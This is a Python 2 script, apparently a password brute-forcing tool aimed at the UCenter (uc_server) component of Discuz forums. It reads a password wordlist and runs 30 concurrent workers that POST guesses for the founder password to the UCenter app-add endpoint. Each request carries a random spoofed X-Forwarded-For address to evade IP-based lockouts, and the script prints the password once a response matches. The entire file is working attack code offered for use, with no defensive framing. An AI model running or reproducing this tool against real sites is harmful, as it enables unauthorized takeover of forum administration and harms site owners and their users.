#!/usr/bin/env python
#-*-coding=utf-8-*-
import Queue
import gevent
from random import randint as rand
from gevent import monkey
monkey.patch_all()
import requests
import time

class Uc_Blasting():
    def __init__(self, url):
        self.url = url
        self.queue = Queue.Queue()
        self.run()

    def load_worker(self):
        with open('dict/uc_server_password.txt', 'r') as f:
            uc_server_password = f.readlines()

        for pwd in uc_server_password:
            self.queue.put(pwd.strip())

    def exploit(self):
        while not self.queue.empty():
            password = self.queue.get()
            ip = '{}.{}.{}.{}'.format(rand(100, 254), rand(100, 254), rand(100, 254), rand(100, 254))
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
                'Referer': 'http://www.baidu.com',
                'X-Forwarded-For': ip,
                'Cookie': 'discuz=discuz'
            }
            data={'ucfounderpw':password}
            print '\r[ Scaning... ] uc server blasting to {pwd}\t\t\t\t\t'.format(pwd=password),
            try:
                html = requests.post(
                    self.url + '/uc_server/index.php?m=app&a=add'.format(password), headers=headers,data=data, timeout=10, allow_redirects=False)
                if len(html.content.split('|'))==9:
                    print '\r[ {time} ] uc server passwrod: {password}\t\t'.format(time=time.strftime('%X', time.localtime()),password=password)
                    self.queue.queue.clear()

            except Exception as e:
                pass

    def run(self):
        self.load_worker()
        jobs = []
        for i in range(30):
            jobs.append(gevent.spawn(self.exploit))
        gevent.joinall(jobs)
